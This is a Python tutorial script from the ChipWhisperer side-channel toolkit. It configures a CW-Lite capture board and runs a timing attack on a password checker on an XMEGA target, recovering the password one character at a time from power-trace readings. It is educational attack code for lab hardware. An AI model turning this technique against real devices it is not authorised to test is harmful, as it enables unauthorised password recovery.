#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2013-2016, NewAE Technology Inc
# All rights reserved.
#
# Authors: Colin O'Flynn, Greg d'Eon
#
# Find this and more at newae.com - this file is part of the chipwhisperer
# project, http://www.assembla.com/spaces/chipwhisperer
#
#    This file is part of chipwhisperer.
#
#    chipwhisperer is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    chipwhisperer is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Lesser General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with chipwhisperer.  If not, see <http://www.gnu.org/licenses/>.
#=================================================
#

"""
This script is an example of a timing attack on a simple password checker. 
It is the result of Tutorial B3-1 from the ChipWhisperer Wiki.

Usage: ::
    python cwlite-timingattack.py
"""

from chipwhisperer.common.api.CWCoreAPI import CWCoreAPI  # Import the ChipWhisperer API
from chipwhisperer.common.scripts.base import UserScriptBase


class UserScript(UserScriptBase):
    _name = "Timing Attack on CW-Lite (XMEGA)"
    _description = "SimpleSerial Timing Attack on CW-Lite (XMEGA)"

    def __init__(self, api):
        super(UserScript, self).__init__(api)

    def run(self):
        """
        Set up the CWLite to record power traces while attempting passwords
        and perform a timing attack to recover the password.
        
        Called when the script is run (from command line or from CW-Capture)
        """
        
        # First: set up the basics and connect to the CW-Lite
        self.api.setParameter(['Generic Settings', 'Scope Module', 'ChipWhisperer/OpenADC'])
        self.api.setParameter(['Generic Settings', 'Target Module', 'Simple Serial'])
        self.api.setParameter(['Generic Settings', 'Trace Format', 'ChipWhisperer/Native'])
        self.api.setParameter(['Simple Serial', 'Connection', 'NewAE USB (CWLite/CW1200)'])
        self.api.setParameter(['ChipWhisperer/OpenADC', 'Connection', 'NewAE USB (CWLite/CW1200)'])
        self.api.connect()
        
        
        # Next: set up everything we need to connect to the target
        # Put all of our commands in a list and execute them at the end
        lstexample = [
                      # Gain
                      ['OpenADC', 'Gain Setting', 'Setting', 45],
                      # Trigger
                      ['OpenADC', 'Trigger Setup', 'Mode', 'rising edge'],
                      ['OpenADC', 'Trigger Setup', 'Offset', 0],
                      ['OpenADC', 'Trigger Setup', 'Total Samples', 2000],
                      # Clock
                      ['OpenADC', 'Clock Setup', 'CLKGEN Settings', 'Desired Frequency', 7370000.0],
                      ['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'CLKGEN x4 via DCM'],
                      ['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None],
                      # Pins
                      ['CW Extra Settings', 'Trigger Pins', 'Target IO4 (Trigger Line)', True],
                      ['CW Extra Settings', 'Target HS IO-Out', 'CLKGEN'],
                      ['CW Extra Settings', 'Target IOn Pins', 'Target IO1', 'Serial RXD'],
                      ['CW Extra Settings', 'Target IOn Pins', 'Target IO2', 'Serial TXD'],
                      # Automatic commands
                      ['Simple Serial', 'Load Key Command', ''],
                      ['Simple Serial', 'Go Command', 'h0px3\n'],
                      ['Simple Serial', 'Output Format', ''],
                      # Auto-reset
                      ['Generic Settings', 'Auxiliary Module', 'Reset AVR/XMEGA via CW-Lite'],
                      ['Reset AVR/XMEGA via CW-Lite', 'Delay (Post-Arm)', 1200],
                      ]
        
        #Download all hardware setup parameters
        for cmd in lstexample: 
            self.api.setParameter(cmd)
                       
        # Get one capture for fun
        self.api.capture1()
        data = self.api.getScope().datapoints
        print data
        
        # Crack the first letter
        password = ''
        trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'
          
        for i in range(5):
            for c in trylist:
                # Get a power trace using our next attempt
                nextPass = password + '{}'.format(c)
                self.api.setParameter(['Simple Serial', 'Go Command', '{}\n'.format(nextPass)])
                self.api.capture1()
                
                # Grab the trace
                nextTrace = self.api.getScope().datapoints
                
                # Check location 153, 225, etc. If it's too low, we've failed
                if nextTrace[153 + 72*i] < -0.2:
                    continue
                    
                # If we got here, we've found the right letter
                password += c
                print '{} characters: {}'.format(i+1, password)
                break


if __name__ == '__main__':
    import chipwhisperer.capture.ui.CWCaptureGUI as cwc         # Import the ChipWhispererCapture GUI
    from chipwhisperer.common.utils.parameter import Parameter  # Comment this line if you don't want to use the GUI
    Parameter.usePyQtGraph = True                               # Comment this line if you don't want to use the GUI
    api = CWCoreAPI()                                           # Instantiate the API
    app = cwc.makeApplication("Capture")                        # Change the name if you want a different settings scope
    gui = cwc.CWCaptureGUI(api)                                 # Comment this line if you don't want to use the GUI
    gui.show()                                                  # Comment this line if you don't want to use the GUI
    api.runScriptClass(UserScript)                              # Run the User Script (executes "run()" by default)
    app.exec_()                                                 # Comment this line if you don't want to use the GUI
